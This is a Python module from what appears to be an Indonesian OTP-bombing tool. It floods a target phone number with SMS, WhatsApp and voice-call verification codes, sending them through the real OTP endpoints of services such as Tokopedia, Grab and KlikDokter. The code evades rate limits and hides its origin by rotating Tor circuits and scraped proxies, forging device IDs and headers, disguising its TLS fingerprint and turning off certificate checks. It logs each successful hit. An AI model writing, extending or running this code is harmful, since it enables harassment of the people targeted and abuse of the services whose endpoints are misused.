# termux_version/core/attacker.py
import asyncio
import aiohttp
import random
import time
import json
import ssl
import os
import gc
from .utils import autoketik, get_sophisticated_headers, process_payload
try:
    from .breaker import solve_captcha
except ImportError:
    solve_captcha = None

# v17000: Tor Integration
from .tor_manager import get_tor_proxy, renew_circuit
    
# v43 Attacker Module (Smart Backoff + Hot Reload)
    
async def start_async_attack(apis, number, duration=60, concurrency=50, delay=0.5, log_callback=None):
    # v17000: Global Circuit Rotation Counter
    REQUESTS_SINCE_ROTATION = 0
    ROTATION_THRESHOLD = 50 
    proxy_fixed = None # v100: Fix NameError

    print(f"🚀 Launching Async Attack on {number} for {duration} seconds...")
    
    # v29000: Voice
    try:
        from .voice import announce_attack
        announce_attack(number)
    except: pass
    
    # v90: Hardware Check
    from .hardware import is_safe_to_attack
    if not is_safe_to_attack():
        print("🛑 Attack Cancelled due to Hardware Safety Protocols.")
        return

    # v1000000: UNIVERSAL MODE (HARDCODED FALLBACK)
    FALLBACK_APIS = [
      {"name": "[WA] KlikDokter", "url": "https://auth.klikdokter.com/api/v1/otp", "method": "POST", "provider": "all", "data": {"phone": "{c}", "channel": "wa"}},
      {"name": "[SMS] Nutriclub", "url": "https://membership.nutriclub.co.id/api/otp/send", "method": "POST", "provider": "all", "data": {"phone": "{c}", "action": "registration"}},
      {"name": "[SMS] PHD-Delivery", "url": "https://phd.co.id/en/users/sendOTP", "method": "POST", "provider": "all", "data": {"phone_number": "{c}"}},
      {"name": "[CALL] Tokopedia-Voice", "url": "https://accounts.tokopedia.com/otp/c/page/request-otp-v2", "method": "POST", "provider": "all", "headers": {"X-Device-ID": "{random_device_id}", "X-Source": "android"}, "data": {"msisdn": "{c}", "otp_type": "112", "mode": "call"}},
      {"name": "[CALL] Grab-Voice", "url": "https://api.grab.com/grabid/v1/phone/otp", "method": "POST", "provider": "all", "headers": {"X-Grab-Device-ID": "{random_device_id}"}, "data": {"phoneNumber": "{phone}", "countryCode": "ID", "method": "CALL"}},
      {"name": "[SMS] Eraspace", "url": "https://api.eraspace.com/customer/v1/otp", "method": "POST", "provider": "all", "data": {"phone": "{c}", "otpType": "REGISTER"}},
      {"name": "[SMS] Marugame", "url": "https://api.marugame.co.id/api/v1/auth/otp", "method": "POST", "provider": "all", "data": {"phoneNumber": "{phone}"}}
    ]

    # Universal Provider Logic (Ignored)
    # We no longer filter by provider. We attack with EVERYTHING.
    
    # Filter APIs (UNIVERSAL MODE: BYPASS FILTER)
    # valid_apis = [api for api in apis if api.get("provider", "all") == "all" or api.get("provider") == provider]
    
    # If apis list is empty or broken, use FALLBACK
    if not apis:
        print("⚠️ [SYSTEM] External APIs corrupt. Engaging HARDCODED FALLBACK (Universal Mode).")
        valid_apis = FALLBACK_APIS
    else:
        # Use provided APIs but IGNORE provider filter (All are valid)
        valid_apis = apis
        print(f"🔥 [SYSTEM] Universal Mode Engaged. Target: {number}. Loaded {len(valid_apis)} APIs.")
    
    if not valid_apis:
        # Should be impossible now
        print("⚠️ [CRITICAL] No APIs found even after Fallback.")
        return

    end_time = time.time() + duration
    formatted_number = number if not number.startswith("0") else "62" + number[1:]
    
    # v41: Smart Backoff Cooldown Map
    COOLDOWN_MAP = {} # {url: timestamp_when_available}
        
    # v7000: PROXY PRE-VALIDATION
    # Instead of live rotating trash proxies, we validate a batch first.
    if not proxy_fixed:
        from .proxy_scraper import scrape_proxies
        from .proxy_validator import filter_proxies
        raw_proxies = scrape_proxies() or []
        high_quality_proxies = await filter_proxies(raw_proxies)
        
        if not high_quality_proxies:
            print("⚠️ [PHANTOM] No Elite Proxies found. Continuing with raw list (Risk High).")
            proxies_pool = raw_proxies
        else:
            proxies_pool = high_quality_proxies
            
    async with aiohttp.ClientSession() as session:
        loops = 0
        while time.time() < end_time:
            # v7000: CHAOS RHYTHM (Burst vs Trickle)
            # Randomly switch mode every loop
            mode = random.choice(["BURST", "TRICKLE"])
            
            if mode == "BURST":
                # v23000: Consult Sentinel
                from .hardware import get_adaptive_concurrency
                safe_limit = get_adaptive_concurrency(concurrency)
                
                current_concurrency = safe_limit
                loop_delay = 0.1
            else:
                current_concurrency = max(1, concurrency // 5)
                loop_delay = random.uniform(1.0, 3.0)

            loops += 1
            if loops % 10 == 0:
                 try:
                     api_path = os.path.join(os.path.dirname(__file__), '../config/apis.json')
                     with open(api_path, 'r') as f: new_apis = json.load(f)
                     
                     if not new_apis:
                         # If reload fails/empty, keep existing valid_apis or use fallback
                         valid_apis = FALLBACK_APIS
                     else:
                         # Universal Mode: Use all, ignore provider
                         valid_apis = new_apis
                 except Exception: 
                     # If file read error, keep using current valid_apis
                     pass

            tasks = []
            
            # v41: Select only available APIs (not in cooldown)
            available_apis = []
            now = time.time()
            for api in valid_apis:
                url = api.get("url")
                if url in COOLDOWN_MAP:
                    if now < COOLDOWN_MAP[url]:
                        continue 
                    else:
                        del COOLDOWN_MAP[url]
                available_apis.append(api)
            
            if not available_apis:
                await asyncio.sleep(1)
                continue

            # v6000: BRAIN CONSULTATION
            from .brain import should_use_api
            smart_apis = []
            for api in available_apis:
                if should_use_api(api.get("name"), provider):
                     smart_apis.append(api)
            
            if not smart_apis and available_apis: 
                smart_apis = available_apis
            
            selected_apis = random.sample(smart_apis, min(len(smart_apis), current_concurrency))
            
            for api in selected_apis:
                # v50: Jitter Mode (Human-like Random Delay)
                jitter = random.uniform(0.1, 1.5) if mode == "TRICKLE" else 0
                await asyncio.sleep(jitter) 
                
                # v30000: HYPER-SPEED ROUTING
                if proxy_fixed:
                    current_proxy = proxy_fixed
                elif proxies_pool:
                    # Pick from Top 10 Fastest Proxies (Round Robin)
                    # proxies_pool is already sorted by latency in proxy_validator.py
                    top_n = min(len(proxies_pool), 20)
                    proxy_idx = random.randint(0, top_n - 1)
                    current_proxy = proxies_pool[proxy_idx] if isinstance(proxies_pool[0], str) else proxies_pool[proxy_idx]['url']
                else:
                    current_proxy = None
                
                # v41: Backoff Wrapper
                tasks.append(asyncio.create_task(smart_send_attack(session, api, number, formatted_number, current_proxy, COOLDOWN_MAP, log_callback)))
                
            await asyncio.gather(*tasks)
            
            # v8000: PULSE WAVE (Micro-Bursts)
            # v28000: CHAOS PULSE
            from .chaos import get_chaos_delay
            chaos_pause = get_chaos_delay(2.0)
            await asyncio.sleep(chaos_pause) 
            
    print("🏁 Attack Finished.")
    gc.collect() 
    
    # Stop Tor to save battery? No, keep it running for next attack. 

async def smart_send_attack(session, api, number, formatted_number, proxy_url, cooldown_map, log_callback=None):
    name = api.get("name")
    url = api.get("url")
    method = api.get("method", "POST")
    data = api.get("data")
    
    # v8000: DoH Bypass
    from .resolver import patch_url
    final_url, host_header = patch_url(url)
    
    # Process Payload
    data = process_payload(data, number, formatted_number)
    
    # v100: Header Priority Fix (API > Random)
    # We want Sophisticated Headers as base, but API headers should OVERRIDE them.
    base_headers = get_sophisticated_headers()
    api_headers = api.get("headers", {}).copy()
    
    # Process placeholders in API headers
    api_headers = process_payload(api_headers, number, formatted_number)
    
    # Merge: Base updates with API (API wins)
    base_headers.update(api_headers)
    headers = base_headers
    
    if host_header:
        headers["Host"] = host_header # Essential for Shared Hosting / SNI
    
    # v4000: TLS Morphing
    try:
        from .stealth_ssl import create_stealth_context
        # If we use IP directly (DoH), SSL verification might fail on Hostname mismatch
        # We need to disable check_hostname if using IP
        ssl_ctx = create_stealth_context()
        if host_header:
             ssl_ctx.check_hostname = False
             ssl_ctx.verify_mode = ssl.CERT_NONE
    except ImportError:
        ssl_ctx = False 

    # v4000: Multi-Step Attack Flow
    try:
        # Step 1: Pre-Attack (Token Fetch) - Optional
        if "init_url" in api:
            # Also patch init_url
            init_url_patched, init_host = patch_url(api["init_url"])
            init_headers = headers.copy()
            if init_host: init_headers["Host"] = init_host
            
            async with session.get(init_url_patched, headers=init_headers, proxy=proxy_url, ssl=ssl_ctx, timeout=5) as init_resp:
                # Extract CSRF or Cookie if needed (Simplified logic)
                pass

        # Step 2: Main Attack
        timeout = aiohttp.ClientTimeout(total=10)
        async with session.request(method, final_url, headers=headers, json=data if isinstance(data, dict) else None, data=data if isinstance(data, str) else None, proxy=proxy_url, timeout=timeout, ssl=ssl_ctx) as response:
            
            resp_text = await response.text()
            
            # v4000: Advanced Response Analysis
            from .response_analyzer import analyze_response
            is_success, status_msg = analyze_response(response.status, resp_text)

            # v41: Smart Backoff Trigger
            if status_msg == "BLOCKED" or response.status == 429:
                if cooldown_map is not None:
                     cooldown_map[url] = time.time() + 60 
                return

            if is_success:
                is_lite = os.environ.get("NAZHAN_LITE") == "1"
                
                if not is_lite:
                    try: from rich import print as rprint
                    except: rprint = print
                    rprint(f"[bold green]✅ {name} -> {number} [{status_msg}][/bold green]")
                else:
                    print(f"✅ {name} -> {number}")
                
                # Log success (Async Wrapper)
                try:
                    log_path = os.path.join(os.path.dirname(__file__), '../logs/success.txt')
                    loop = asyncio.get_running_loop()
                    await loop.run_in_executor(None, lambda: open(log_path, "a").write(f"{number} | {name} | {time.ctime()}\n"))
                    
                    # v70: Telegram Hook
                    if log_callback:
                        log_msg = f"✅ {name} -> {number} [{status_msg}]"
                        if asyncio.iscoroutinefunction(log_callback):
                            await log_callback(log_msg)
                        else:
                            await loop.run_in_executor(None, log_callback, log_msg)
                except: pass
                
                from .brain import feedback
                
            else:
                 pass

    except Exception as e:
        # v33000: Error Logging (Async Wrapper)
        try:
             err_path = os.path.join(os.path.dirname(__file__), '../logs/error.log')
             loop = asyncio.get_running_loop()
             await loop.run_in_executor(None, lambda: open(err_path, "a").write(f"{time.ctime()} | {name} | {str(e)}\n"))
        except: pass
